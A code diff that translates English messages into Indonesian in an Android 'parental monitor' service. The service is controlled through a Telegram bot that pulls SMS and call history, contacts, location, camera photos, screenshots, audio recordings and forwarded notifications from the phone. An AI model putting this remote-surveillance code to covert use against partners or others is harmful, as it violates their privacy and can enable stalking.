@@ -978,7 +978,7 @@ class MonitoringService : Service() {
             preferencesManager.credentialErrorAt = 0L
             refreshCreds()
             try {
-                messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
+                messageQueue.addMessage("\u267B\uFE0F Grup ditingkatkan jadi supergrup \u2014 Chat ID diperbarui otomatis.", true)
                 MessageScheduler.scheduleMessageSend(this)
             } catch (_: Exception) {
             }
@@ -1361,7 +1361,7 @@ class MonitoringService : Service() {
                                         try { pairAttemptAt.remove(senderId) } catch (_: Exception) { }
                                         try { pairGlobalFails.set(0) } catch (_: Exception) { }
                                         registerBotCommands()
-                                        sendToTelegram("Owner tertaut via /start.")
+                                        sendToTelegram("Pemilik tertaut via /start.")
                                     }
                                 } else {
                                     if (startTokens.size >= 2 && startTokens[0] == chatId && pairCode.isNotEmpty()) {
@@ -1379,7 +1379,7 @@ class MonitoringService : Service() {
                                 }
                             }
                         } else if (senderId != cachedOwnerId.toString()) {
-                            sendToTelegram("\u26A0\uFE0F Pairing attempt ignored: owner already linked.")
+                            sendToTelegram("\u26A0\uFE0F Pemasangan diabaikan: pemilik sudah tertaut.")
                         }
                     }
                     val ownerOk = isOwner(senderId)
@@ -1507,8 +1507,8 @@ class MonitoringService : Service() {
                 Intent(this, com.redeye.parentalmonitor.ui.SetupActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
                 android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
             )
-            val title = if (code == 400) "Chat not found (400)" else "Bot token rejected ($code)"
-            val text = if (code == 400) "Open Setup to fix the chat ID so messages work again." else "Open Setup to fix the token so commands work again."
+            val title = if (code == 400) "Chat tak ditemukan (400)" else "Token bot ditolak ($code)"
+            val text = if (code == 400) "Buka Setup dan perbaiki Chat ID agar pesan jalan lagi." else "Buka Setup dan perbaiki token agar perintah jalan lagi."
             val notification = NotificationCompat.Builder(this, ParentalMonitorApp.RESUME_CHANNEL_ID)
                 .setSmallIcon(R.drawable.ic_notification)
                 .setContentTitle(title)
@@ -1658,13 +1658,13 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.InlineButton(text, data)
         return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
             listOf(
-                listOf(button("\uD83D\uDCF8 Photo", "photo"), button("\uD83D\uDCCD Location", "location")),
-                listOf(button("\uD83D\uDCDE Calls", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
-                listOf(button("\uD83D\uDCF7 Front", "camfront"), button("\uD83D\uDCF7 Back", "camback")),
-                listOf(button("⏸️ Pause 60 min", "pause60"), button("▶️ Resume", "resume")),
-                listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status")),
-                listOf(button("\uD83E\uDDEA Uji anti-mati", "cekmati"), button("\uD83D\uDC9A Alive", "alive")),
-                listOf(button("\uD83D\uDDA5 Screenshot", "shot"), button("⏹️ Stop", "stop"))
+                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
+                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
+                listOf(button("\uD83D\uDCF7 Kamera depan", "camfront"), button("\uD83D\uDCF7 Kamera belakang", "camback")),
+                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
+                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status")),
+                listOf(button("\uD83E\uDDEA Uji anti-mati", "cekmati"), button("\uD83D\uDC9A Hidup", "alive")),
+                listOf(button("\uD83D\uDDA5 Tangkap layar", "shot"), button("⏹️ Hentikan", "stop"))
             )
         )
     }
@@ -1694,7 +1694,7 @@ class MonitoringService : Service() {
             val redacted = redactToken(e.message)
             android.util.Log.e("MonitoringService", "Command failed: $command ($redacted)")
             try {
-                val detail = redacted.ifEmpty { "unknown error" }
+                val detail = redacted.ifEmpty { "galat tak dikenal" }
                 sendToTelegram("⚠️ Perintah ${Html.escape(command)} gagal (${Html.escape(detail)}). Coba lagi atau kirim /help.")
             } catch (_: Exception) {
             }
@@ -1773,7 +1773,7 @@ class MonitoringService : Service() {
                         appendLine("Patroli: ${if (preferencesManager.patrolEnabled) "JALAN tiap ${preferencesManager.patrolInterval} mnt" else "mati"}")
                         appendLine("Kamera: ${preferencesManager.cameraFacing}")
                         appendLine("Malam: " + if (preferencesManager.nightMode) "JALAN 23–05" + if (isNightPaused()) " (sunyi sekarang)" else "" else "mati")
-                        appendLine("Watch: " + (watchList().takeIf { it.isNotEmpty() }?.joinToString(",") { Html.escape(it) } ?: "mati"))
+                        appendLine("Pantau: " + (watchList().takeIf { it.isNotEmpty() }?.joinToString(",") { Html.escape(it) } ?: "mati"))
                         appendLine("Rumah: " + fenceStatusText(true) + " · Sekolah: " + fenceStatusText(false))
                         appendLine("Izin kamera: ${if (hasCameraPermission()) "ada" else "HILANG"}")
                         appendLine("Izin lokasi: ${if (hasLocationPermission()) "ada" else "HILANG"}")
@@ -1796,7 +1796,7 @@ class MonitoringService : Service() {
                 val missing = try { missingPermLabels(permissionMask(permissionRawStates(), notifOn, snap)) } catch (_: Exception) { ArrayList() }
                 sendToTelegram(buildString {
                     appendLine("🧾 <b>Ringkas</b>")
-                    appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
+                    appendLine("Pemantauan: ${if (preferencesManager.monitoringPaused) "DIJEDA" else "JALAN"}")
                     appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
                     appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
                     appendLine("Izin: " + if (missing.isEmpty()) "semua OK ✅" else "hilang: " + missing.joinToString(", "))
@@ -1848,15 +1848,15 @@ class MonitoringService : Service() {
                 when (arg.lowercase(java.util.Locale.ROOT)) {
                     "on" -> {
                         preferencesManager.patrolEnabled = true
-                        sendToTelegram("\uD83D\uDEF0 Patrol ON \u2014 photo + location every ${preferencesManager.patrolInterval} min.")
+                        sendToTelegram("\uD83D\uDEF0 Patroli NYALA \u2014 foto + lokasi tiap ${preferencesManager.patrolInterval} mnt.")
                     }
                     "off" -> {
                         preferencesManager.patrolEnabled = false
-                        sendToTelegram("\uD83D\uDEF0 Patrol OFF.")
+                        sendToTelegram("\uD83D\uDEF0 Patroli MATI.")
                     }
                     else -> {
-                        val state = if (preferencesManager.patrolEnabled) "ON every ${preferencesManager.patrolInterval} min" else "OFF"
-                        sendToTelegram("Cara pakai: /patrol &lt;on|off&gt; (now $state)")
+                        val state = if (preferencesManager.patrolEnabled) "NYALA tiap ${preferencesManager.patrolInterval} mnt" else "MATI"
+                        sendToTelegram("Cara pakai: /patrol &lt;on|off&gt; (kini $state)")
                     }
                 }
             }
@@ -1866,7 +1866,7 @@ class MonitoringService : Service() {
                     sendToTelegram("Cara pakai: /patrolinterval &lt;5-180&gt;")
                 } else {
                     preferencesManager.patrolInterval = minutes
-                    sendToTelegram("\uD83D\uDEF0 Patrol interval set to $minutes min.")
+                    sendToTelegram("\uD83D\uDEF0 Interval patroli diatur $minutes mnt.")
                 }
             }
             "/night" -> {
@@ -1875,24 +1875,24 @@ class MonitoringService : Service() {
                         preferencesManager.nightMode = true
                         try { restartCameraLoop() } catch (_: Exception) { }
                         try { restartPatrolLoop() } catch (_: Exception) { }
-                        sendToTelegram("🌙 Night mode ON — auto photos/location pause 23:00–05:00.")
+                        sendToTelegram("🌙 Mode malam NYALA — foto/lokasi otomatis dijeda 23:00–05:00.")
                     }
                     "off" -> {
                         preferencesManager.nightMode = false
                         try { restartCameraLoop() } catch (_: Exception) { }
                         try { restartPatrolLoop() } catch (_: Exception) { }
-                        sendToTelegram("🌙 Night mode OFF.")
+                        sendToTelegram("🌙 Mode malam MATI.")
                     }
                     else -> {
-                        val state = if (preferencesManager.nightMode) "ON 23:00–05:00" else "OFF"
-                        sendToTelegram("Cara pakai: /night &lt;on|off&gt; (now $state)")
+                        val state = if (preferencesManager.nightMode) "NYALA 23:00–05:00" else "MATI"
+                        sendToTelegram("Cara pakai: /night &lt;on|off&gt; (kini $state)")
                     }
                 }
             }
             "/pause" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 1..480) {
-                    sendToTelegram("Cara pakai: /pause &lt;minutes&gt; (1-480)")
+                    sendToTelegram("Cara pakai: /pause &lt;menit&gt; (1-480)")
                 } else {
                     preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
                     preferencesManager.photoPauseSource = PHOTO_PAUSE_NONE
@@ -1967,8 +1967,8 @@ class MonitoringService : Service() {
                         sendToTelegram("\uD83D\uDD15 Penerusan notifikasi MATI.")
                     }
                     "status", "" -> {
-                        val state = if (isNotifForwarding()) "forwarding" else "off"
-                        sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
+                        val state = if (isNotifForwarding()) "diteruskan" else "mati"
+                        sendToTelegram("\uD83D\uDD14 Notifikasi: $state (setelan: ${if (preferencesManager.notifForwardEnabled) "nyala" else "mati"})")
                     }
                     else -> {
                         sendToTelegram("Cara pakai: /notif &lt;on|off|status&gt;")
@@ -1990,13 +1990,13 @@ class MonitoringService : Service() {
                 }
                 sendToTelegram(
                     buildString {
-                        appendLine("\uD83E\uDDFE <b>Log error</b>")
+                        appendLine("\uD83E\uDDFE <b>Log galat</b>")
                         val credErr = try {
                             preferencesManager.credentialError
                         } catch (_: Exception) {
                             ""
                         }
-                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
+                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "GAGAL ($credErr)")
                         appendLine("Antrean: ${messageQueue.getQueueSize()}")
                         appendLine("Penyimpanan: " + if (preferencesManager.isStorageEncrypted) "terenkripsi" else "volatil")
                         val camErr = try {
@@ -2004,23 +2004,23 @@ class MonitoringService : Service() {
                         } catch (_: Exception) {
                             0L
                         }
-                        appendLine("Last camera error: " + if (camErr > 0) formatDate(camErr) else "none")
+                        appendLine("Galat kamera terakhir: " + if (camErr > 0) formatDate(camErr) else "tak ada")
                         val upErr = try {
                             preferencesManager.lastUploadErrorNotice
                         } catch (_: Exception) {
                             0L
                         }
-                        appendLine("Last upload error: " + if (upErr > 0) formatDate(upErr) else "none")
+                        appendLine("Galat unggah terakhir: " + if (upErr > 0) formatDate(upErr) else "tak ada")
                     }
                 )
             }
             "/syncinterval" -> {
                 val minutes = arg.toIntOrNull()
                 if (minutes == null || minutes !in 1..1440) {
-                    sendToTelegram("Cara pakai: /syncinterval &lt;1-1440&gt; (minutes)")
+                    sendToTelegram("Cara pakai: /syncinterval &lt;1-1440&gt; (menit)")
                 } else {
                     preferencesManager.syncInterval = minutes
-                    sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
+                    sendToTelegram("\u23F1\uFE0F Interval sinkron diatur $minutes mnt.")
                     try {
                         restartAllLoops()
                     } catch (_: Exception) {
@@ -2056,7 +2056,7 @@ class MonitoringService : Service() {
                 }
                 val scheduled = MessageScheduler.scheduleMessageSend(this)
                 if (scheduled) {
-                    sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
+                    sendToTelegram("\uD83D\uDCE4 Flush dijadwalkan ($queued menunggu). Dikirim saat online.")
                 } else {
                     sendToTelegram("⚠️ Tak bisa menjadwalkan flush ($queued menunggu).")
                 }
@@ -2137,7 +2137,7 @@ class MonitoringService : Service() {
                             restarted = restartAllLoops()
                             if (restarted) pingRestartMark()
                         }
-                        val tail = if (restarted) " ⏰ Loops restarted." else ""
+                        val tail = if (restarted) " ⏰ Loop dijalankan ulang." else ""
                         if (sentAtSec > 0) {
                             val lag = System.currentTimeMillis() / 1000L - sentAtSec
                             sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail)
@@ -2153,7 +2153,7 @@ class MonitoringService : Service() {
             "/record" -> {
                 val seconds = arg.toIntOrNull()
                 if (seconds == null || seconds !in 5..600) {
-                    sendToTelegram("Cara pakai: /record &lt;5-600&gt; (seconds)")
+                    sendToTelegram("Cara pakai: /record &lt;5-600&gt; (detik)")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
                 } else if (!recordBusy.compareAndSet(false, true)) {
@@ -2162,7 +2162,7 @@ class MonitoringService : Service() {
                     recordBusy.set(false)
                     sendToTelegram("⏱️ Sedang berdering, tunggu sebentar.")
                 } else {
-                    sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
+                    sendToTelegram("\uD83C\uDF99\uFE0F Merekam $seconds dtk\u2026")
                     try { recordJob?.cancel() } catch (_: Exception) { }
                     recordJob = serviceScope.launch {
                         try {
@@ -2215,11 +2215,11 @@ class MonitoringService : Service() {
                 }
                 val normalized = digits.toString()
                 if (number.isEmpty() || smsText.isEmpty()) {
-                    sendToTelegram("Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
+                    sendToTelegram("Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
                 } else if (badChar || plusCount > 1 || (plusCount == 1 && !number.startsWith("+")) || (plusCount == 1 && number.startsWith("+") && number.indexOf('+', 1) >= 0)) {
-                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
+                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
                 } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
-                    sendToTelegram("\u26A0\uFE0F Invalid number. Cara pakai: /sms &lt;number&gt; &lt;message&gt;")
+                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
                 } else if (isPremiumSmsNumber(normalized)) {
                     sendToTelegram("\uD83D\uDEAB Nomor premium tidak boleh dipakai /sms.")
                 } else if (isEmergencySmsNumber(normalized)) {
@@ -2242,7 +2242,7 @@ class MonitoringService : Service() {
                         val stagedText = try { preferencesManager.pendingSmsText } catch (_: Exception) { "" }
                         val oldPending = if (stagedNumber.isNotEmpty() && (stagedNumber != normalized || stagedText != smsText)) stagedNumber else ""
                         preferencesManager.writeSmsPendingSync(normalized, smsText, System.currentTimeMillis(), senderId)
-                        sendToTelegram("\uD83D\uDCE9 SMS to <code>$normalized</code> ready to send. Reply /smsconfirm to confirm (valid for 5 minutes)." + if (oldPending.isNotEmpty()) "\nPending lama ke <code>${Html.escape(oldPending)}</code> dibuang." else "")
+                        sendToTelegram("\uD83D\uDCE9 SMS ke <code>$normalized</code> siap dikirim. Balas /smsconfirm untuk konfirmasi (berlaku 5 menit)." + if (oldPending.isNotEmpty()) "\nPending lama ke <code>${Html.escape(oldPending)}</code> dibuang." else "")
                     }
                 }
             }
@@ -2268,7 +2268,7 @@ class MonitoringService : Service() {
                 } else if (!smsBusy.compareAndSet(false, true)) {
                     sendToTelegram("⏱️ SMS masih dikirim, tunggu sebentar.")
                 } else {
-                    sendToTelegram("\uD83D\uDCE9 Sending SMS\u2026")
+                    sendToTelegram("\uD83D\uDCE9 Mengirim SMS\u2026")
                     try { smsJob?.cancel() } catch (_: Exception) { }
                     smsJob = serviceScope.launch {
                         try {
@@ -2392,7 +2392,7 @@ class MonitoringService : Service() {
             }
             "/contacts" -> {
                 if (arg.isEmpty()) {
-                    sendToTelegram("Cara pakai: /contacts &lt;name&gt;")
+                    sendToTelegram("Cara pakai: /contacts &lt;nama&gt;")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("⚠️ Izin Kontak belum diberikan. Buka Setup dan berikan izin Kontak.")
                 } else {
@@ -2402,7 +2402,7 @@ class MonitoringService : Service() {
                     } else {
                         sendToTelegram(
                             buildString {
-                                appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
+                                appendLine("\uD83D\uDC64 <b>Kontak (${found.size})</b>")
                                 for (entry in found) {
                                     appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
                                 }
@@ -2413,7 +2413,7 @@ class MonitoringService : Service() {
             }
             "/apps" -> {
                 if (arg.isNotEmpty() && arg.toIntOrNull() == null) {
-                    sendToTelegram("Cara pakai: /apps [5-50] (default 30)")
+                    sendToTelegram("Cara pakai: /apps [5-50] (bawaan 30)")
                     return
                 }
                 val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
@@ -2448,7 +2448,7 @@ class MonitoringService : Service() {
                 }
                 val digits = arg.filter { it.isDigit() }
                 if (digits.length < 7 || digits.length > 20) {
-                    sendToTelegram("Cara pakai: /history &lt;number&gt; (7-20 digits)")
+                    sendToTelegram("Cara pakai: /history &lt;nomor&gt; (7-20 digit)")
                 } else {
                     val calls = try {
                         callLogRepository.getCallsForNumber(digits, 50).take(5)
@@ -2475,7 +2475,7 @@ class MonitoringService : Service() {
                 if (sub.isEmpty() || sub == "status") {
                     if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
                     val cur = watchList()
-                    sendToTelegram(if (cur.isEmpty()) "👁️ Watch: off (contoh: /watch judi,pinjol,bully)" else "👁️ Watch: " + cur.joinToString(", ") { Html.escape(it) })
+                    sendToTelegram(if (cur.isEmpty()) "👁️ Pantau: mati (contoh: /watch judi,pinjol,bully)" else "👁️ Pantau: " + cur.joinToString(", ") { Html.escape(it) })
                 } else if (sub == "off" || sub == "clear") {
                     preferencesManager.watchKeywords = ""
                     sendToTelegram("👁️ Watch dimatikan.")
@@ -2651,7 +2651,7 @@ class MonitoringService : Service() {
                     val homeReady = try { preferencesManager.homeLatE6 != Long.MIN_VALUE && preferencesManager.homeRadiusM > 0 } catch (_: Exception) { false }
                     sendToTelegram(
                         when {
-                            cur <= 0 -> "🏠 Jemput: off (contoh: /jemput 500)"
+                            cur <= 0 -> "🏠 Jemput: mati (contoh: /jemput 500)"
                             !homeReady -> "🏠 Jemput: tersimpan ±${cur} m, tapi TIDAK aktif — geofence /home sedang mati/kosong. Hidupkan /home dulu."
                             else -> "🏠 Jemput: aktif ±${cur} m dari rumah (sekali bunyi)"
                         }
@@ -2738,7 +2738,7 @@ class MonitoringService : Service() {
                         appendLine("/waspada - skor kewaspadaan 0-100")
                         appendLine("/hilang - bunyi+lokasi+foto sekaligus")
                         appendLine("/jemput &lt;meter|off&gt; - kabari saat dekat rumah")
-                        appendLine("/log - log error terakhir")
+                        appendLine("/log - log galat terakhir")
                         appendLine("/help - daftar ini")
                         appendLine("Tanpa / juga bisa: dimana, foto, ding, kunci, baterai, bantu")
                     },
@@ -2999,15 +2999,15 @@ class MonitoringService : Service() {
             }
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
             val startMessage = buildString {
-                appendLine("📱 <b>Monitoring started</b>")
+                appendLine("📱 <b>Pemantauan dimulai</b>")
                 appendLine()
                 appendLine("⏰ Waktu: ${formatDate(System.currentTimeMillis())}")
                 appendLine()
-                appendLine("📊 Found on device:")
+                appendLine("📊 Ditemukan di perangkat:")
                 appendLine("• SMS: ${pendingSms.size}")
-                appendLine("• Calls: ${pendingCalls.size}")
+                appendLine("• Panggilan: ${pendingCalls.size}")
                 appendLine()
-                appendLine("Sending history...")
+                appendLine("Mengirim riwayat...")
             }
             sendToTelegram(startMessage)
             delay(500)
@@ -3018,7 +3018,7 @@ class MonitoringService : Service() {
                 val smsTotal = pendingSms.size
                 for ((index, part) in pendingSms.chunked(10).withIndex()) {
                     val message = buildString {
-                        appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
+                        appendLine("💬 <b>Riwayat SMS (${index * 10 + 1}-${index * 10 + part.size} dari $smsTotal)</b>")
                         appendLine()
                         part.forEach { sms ->
                             appendLine("📞 Nomor: ${Html.escape(sms.address)}")
@@ -3048,7 +3048,7 @@ class MonitoringService : Service() {
                 val callTotal = pendingCalls.size
                 for ((index, part) in pendingCalls.chunked(10).withIndex()) {
                     val message = buildString {
-                        appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
+                        appendLine("📞 <b>Riwayat Panggilan (${index * 10 + 1}-${index * 10 + part.size} dari $callTotal)</b>")
                         appendLine()
                         part.forEach { call ->
                             appendLine("📱 Nomor: ${Html.escape(call.number)}")
@@ -3084,7 +3084,7 @@ class MonitoringService : Service() {
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
             val photoState = if (isPhotoPaused()) {
                 val leftMin = ((photoPausedElapsed() - System.currentTimeMillis()) / 60_000L).coerceAtLeast(1L)
-                "paused ($leftMin min left)"
+                "dijeda (sisa $leftMin mnt)"
             } else if (preferencesManager.cameraInterval <= 0) {
                 "manual saja (/photo)"
             } else {
@@ -3316,7 +3316,7 @@ class MonitoringService : Service() {
                 } else if (okCount.get() > 0) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
                     val smsPreview = try { Html.escape(smsText).let { it.take(safeCut(it, 120)) } } catch (_: Exception) { "" }
-                    val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts." else "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts) to $number. Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts. Text preview: $smsPreview"
+                    val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS terkirim sebagian (${okCount.get()}/$expected bagian). Yang tertunda disimpan; cek ke penerima dulu sebelum coba lagi karena bisa terkirim dobel." else "\u26A0\uFE0F SMS terkirim sebagian (${okCount.get()}/$expected bagian) ke $number. Yang tertunda disimpan; cek ke penerima dulu sebelum coba lagi karena bisa terkirim dobel. Pratinjau teks: $smsPreview"
                     sendToTelegram(smsNotice)
                 } else {
                             sendToTelegram("⚠️ SMS belum terkonfirmasi terkirim. Yang tertunda disimpan, coba /smsconfirm lagi.")
@@ -4240,7 +4240,7 @@ class MonitoringService : Service() {
             val lon = (if (isHome) preferencesManager.homeLonE6 else preferencesManager.schoolLonE6) / 1_000_000.0
             val rad = if (isHome) preferencesManager.homeRadiusM else preferencesManager.schoolRadiusM
             val la = if (isHome) preferencesManager.homeLatE6 else preferencesManager.schoolLatE6
-            if (la == Long.MIN_VALUE || rad <= 0) "off" else "$lat,$lon ±${rad}m"
+            if (la == Long.MIN_VALUE || rad <= 0) "mati" else "$lat,$lon ±${rad}m"
         } catch (_: Exception) {
             "?"
         }
@@ -4329,7 +4329,7 @@ class MonitoringService : Service() {
                 appendLine("🌙 <b>Ringkasan harian</b>")
                 appendLine("SMS 24 jam: ${if (sms.size >= 200) "200+" else "${sms.size}"}, Panggilan: ${if (calls.size >= 200) "200+" else "${calls.size}"}${if (sms.size >= 200 || calls.size >= 200) " (dari 200 terakhir)" else ""}")
                 if (top.isEmpty()) appendLine("Kontak teratas: -") else appendLine("Teratas: " + top.joinToString(", ") { it.key + " (${it.value}x)" })
-                if (watch.isNotEmpty() || hits > 0) appendLine("Watch hit: $hits")
+                if (watch.isNotEmpty() || hits > 0) appendLine("Kena pantau: $hits")
                 try { screenTimeSummary(24)?.let { appendLine(it) } } catch (_: Exception) { }
                 appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
                 appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
@@ -4638,11 +4638,11 @@ class MonitoringService : Service() {
             sendToTelegram(buildString {
                 appendLine("📊 <b>Laporan 7 hari</b>")
                 appendLine("SMS: ${if (sms.size >= 200) "200+" else "${sms.size}"}, Panggilan: ${if (calls.size >= 200) "200+" else "${calls.size}"}")
-                if (top.isEmpty()) appendLine("Top kontak: -") else appendLine("Top: " + top.joinToString(", ") { it.key + " (${it.value}x)" })
+                if (top.isEmpty()) appendLine("Kontak teratas: -") else appendLine("Teratas: " + top.joinToString(", ") { it.key + " (${it.value}x)" })
                 if (busy in 0..23) appendLine("Jam tersibuk: ${busy}:00 (${hours[busy]} aktivitas)")
                 appendLine("Aktif 00–23: " + sparkline(hours))
                 appendLine("Begadang (23–05): $nights")
-                if (watch.isNotEmpty() || watchNums.isNotEmpty()) appendLine("Watch hit: $watchHits")
+                if (watch.isNotEmpty() || watchNums.isNotEmpty()) appendLine("Kena pantau: $watchHits")
                 if (capped) appendLine("(dari 200 data terakhir)")
             },
                 mainMenu()
@@ -4750,7 +4750,7 @@ class MonitoringService : Service() {
         return buildString {
             appendLine("💚 <b>Alive</b>")
             appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "JEDA" else "JALAN"}")
-            appendLine("Uptime: ${if (started > 0) durationText(now - started) else "?"}")
+            appendLine("Lama nyala: ${if (started > 0) durationText(now - started) else "?"}")
             if (started > 0) appendLine("Sejak: " + formatDate(started))
             appendLine("Denyut terakhir: " + if (beatAge >= 0L) {
                 val at = if (lastAlive > 0L) " pukul " + Liveness.clockText(lastAlive) else ""
@@ -5492,7 +5492,7 @@ class MonitoringService : Service() {
                     if (reportResult) {
                         sendToTelegram("⚠️ Izin tangkap layar dicabut. Buka Setup, tekan Capture Screen untuk memberikannya lagi.")
                     } else {
-                        notifyPhotoSendFailure("screen capture revoked")
+                        notifyPhotoSendFailure("izin tangkap layar dicabut")
                     }
                     return@launch
                 }
@@ -5715,9 +5715,15 @@ class MonitoringService : Service() {
     }
 
     private fun sanitizedCameraError(reason: String?): String {
-        if (isCameraPolicyError(reason)) return "camera disabled by device policy (CAMERA_DISABLED)"
-        val firstLine = (reason ?: "unknown error").lineSequence().firstOrNull()?.trim().orEmpty()
-        if (firstLine.isEmpty()) return "unknown error"
+        if (isCameraPolicyError(reason)) return "kamera dimatikan kebijakan perangkat (CAMERA_DISABLED)"
+        val known = when ((reason ?: "").trim()) {
+            "photo backlog full" -> "antrean foto penuh"
+            "camera permission missing" -> "izin kamera belum diberikan"
+            else -> null
+        }
+        if (known != null) return known
+        val firstLine = (reason ?: "galat tak dikenal").lineSequence().firstOrNull()?.trim().orEmpty()
+        if (firstLine.isEmpty()) return "galat tak dikenal"
         val cleaned = firstLine.replace(CONNECT_HELPER_REGEX, "")
         return cleaned.take(160)
     }
